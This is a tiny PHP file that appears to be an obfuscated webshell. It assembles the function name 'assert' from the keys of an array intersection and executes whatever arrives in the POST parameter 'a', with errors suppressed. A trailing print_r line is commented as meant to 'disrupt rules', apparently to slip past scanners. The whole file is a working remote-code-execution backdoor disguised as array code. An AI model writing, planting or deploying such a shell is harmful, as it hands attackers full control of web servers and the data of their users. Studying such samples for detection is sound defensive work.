<?php
$a1=array("a"=>"red","ss"=>"green","c"=>"blue","er"=>"hello","t"=>"hey");
$a2=array("a"=>"red","ss"=>"blue","d"=>"pink","er"=>"hellos","moza"=>"good_boy","t"=>"hey");
$result=array_intersect_key($a1,$a2);//取数组交集
$a = array_keys($result);//取数组键值
$man = $a[0].$a[1].$a[2]."t";
$kk=$_POST['a'];
@$man($kk=$kk);
print_r($a1);//扰乱规则
?>